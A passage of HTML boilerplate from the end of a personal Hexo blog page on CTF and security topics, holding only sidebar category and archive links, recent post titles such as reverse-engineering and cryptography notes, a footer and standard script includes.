      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE/">CVE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/FE/">FE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/balabala/">balabala</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/07/29/深入浅出密码学读书笔记/">深入浅出密码学读书笔记</a>
          </li>
        
          <li>
            <a href="/2019/07/29/逆向工程核心原理笔记/">Reversing-engineering</a>
          </li>
        
          <li>
            <a href="/2019/07/29/看雪ctf4/">2018看雪ctf第四题-密界寻踪</a>
          </li>
        
          <li>
            <a href="/2019/07/29/汇编入门/">CTF二进制总结0X03</a>
          </li>
        
          <li>
            <a href="/2019/07/29/函数调用约定/">Calling Convention</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>